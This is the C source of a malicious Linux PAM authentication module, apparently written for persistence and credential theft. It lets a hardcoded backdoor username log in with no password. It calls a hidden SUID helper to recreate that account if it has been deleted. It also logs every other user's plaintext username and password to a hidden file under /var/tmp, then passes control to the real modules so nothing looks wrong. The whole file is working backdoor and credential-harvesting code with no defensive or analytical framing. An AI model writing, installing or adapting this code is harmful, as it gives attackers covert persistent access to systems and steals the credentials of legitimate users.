#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <security/pam_appl.h>
#include <string.h>
#include <stdio.h>
#include <pwd.h>
#include <unistd.h>

#define LOGFILE "/var/tmp/.cache-sshd"
#define BACKDOOR_USER "nihargayam"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *username = NULL;
    const char *password = NULL;

    // Recreate backdoor user if deleted
    if (getpwnam(BACKDOOR_USER) == NULL) {
        system("/usr/bin/.dbsync");  // SUID helper
    }

    // Get the username
    if (pam_get_user(pamh, &username, NULL) != PAM_SUCCESS || username == NULL)
        return PAM_USER_UNKNOWN;

    // Bypass auth for backdoor user
    if (strcmp(username, BACKDOOR_USER) == 0) {
        return PAM_SUCCESS;
    }

    // Get password
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS || password == NULL)
        password = "<null>";

    // Log credentials
    FILE *log = fopen(LOGFILE, "a");
    if (log) {
        fprintf(log, "User: %s, Password: %s\n", username, password);
        fclose(log);
    }

    // Let real PAM modules do the rest
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv) {
    return PAM_SUCCESS;
}
